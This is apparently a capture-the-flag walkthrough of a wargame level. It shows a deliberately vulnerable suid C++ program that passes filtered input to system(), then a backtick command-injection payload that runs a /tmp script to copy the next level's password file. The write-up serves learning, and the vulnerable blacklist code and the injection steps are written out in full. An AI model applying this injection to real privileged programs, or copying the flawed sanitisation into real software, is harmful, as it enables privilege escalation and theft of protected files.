---
layout: post
title:  "Blackbox"
subtitle: "Level 3"
date:   2012-01-22
categories: reverse-engineering
---

Hi again. This is be another chapter in the series of the blackbox walkthrough.

__As in the previous posts, the password for the next level has been replaced with question marks so as to not make this too obvious, and so that the point of the walkthrough, which is mainly educational, will not be missed.__

Also, make sure you notice this SPOILER ALERT! If you want to try and solve the level by yourself then read no further!

Good, let's start:

```
$ ssh -p 2225 level3@blackbox.smashthestack.org
level3@blackbox.smashthestack.org's password:
...
level3@blackbox:~$ ls -l
total 1180
-rw-r--r-- 1 root   level3      12 2007-12-29 14:10 password
-rwxr-xr-x 1 root   level3      59 2007-12-29 14:10 PID
-rwsr-xr-x 1 level4 level4 1189178 2008-01-15 01:42 proclist
-rw-r--r-- 1 root   level3     490 2007-12-29 14:10 proclist.cc
```

Again, the executable has the suid bit, which means we need to make the program do something for us.

Let's take a look at the source we got:

```cpp
#include <iostream>
#include <string>

int main(int main, char **argv)
{
 std::string command;
 std::string program;

 std::cout << "Enter the name of the program: ";
 std::cin >> program;

 for(unsigned int i = 0; i < program.length(); i++) {
  if(strchr(";^&|><", program[i]) != NULL) {
   std::cout << "Fatal error" << std::endl;
   return 1;
  }
 }


 // Execute the command to list the programs
 command = "/bin/ps |grep ";
 command += program;
 system(command.c_str());

 return 0;
}
```

Well, looks pretty straightforward, the program reads some string, then sanitizes it a bit, and then runs `ps` and filters the output according to that string.

Seems pretty airtight though...We can't use spaces as `cin` will only take the first word. We can't do any fancy shell stuff like redirection or piping...

However, there is one thing that does not get sanitized here - backticks! So if we write some expression inside backticks, when it gets passed to system, `sh` will resolve whatever is in the backticks, and append the output as a parameter to `grep`.

What can we do then? Anything which can be scripted in a file.

What do we want? Level 4's password.

Well, the obvious way to do that is to print the contents of `/home/level4/password` to some file in a place to which we have access (like `/tmp/`).

But this requires some preparation, because if we want to redirect into some file, we need to make sure the `level4` user has permissions to write to that file.

So first we make the file:

```
level3@blackbox:/tmp$ touch level4pass
level3@blackbox:/tmp$ ls -l level4pass
-rw-r--r-- 1 level3 gamers 0 2012-01-22 17:39 level4pass
level3@blackbox:/tmp$ chmod ugo+rw level4pass
level3@blackbox:/tmp$ ls -l level4pass
-rw-r--rw- 1 level3 gamers 0 2012-01-22 17:39 level4pass
```

And write the script:

```
level3@blackbox:/tmp$ cat > getlevel4pass
#!/bin/sh
cat /home/level4/password > /tmp/level4pass

level3@blackbox:/tmp$ chmod ugo+rwx getlevel4pass
level3@blackbox:/tmp$ ls -l getlevel4pass
-rwxrwxrwx 1 level3 gamers 54 2012-01-22 17:42 getlevel4pass
```

And make `proclist` run it:

```
level3@blackbox:~$ ./proclist 
Enter the name of the program: `/tmp/getlevel4pass` 
Usage: grep [OPTION]... PATTERN [FILE]...
Try `grep --help' for more information.
Let's check if it did anything:

level3@blackbox:~$ cat /tmp/level4pass
?????????
```

Success!
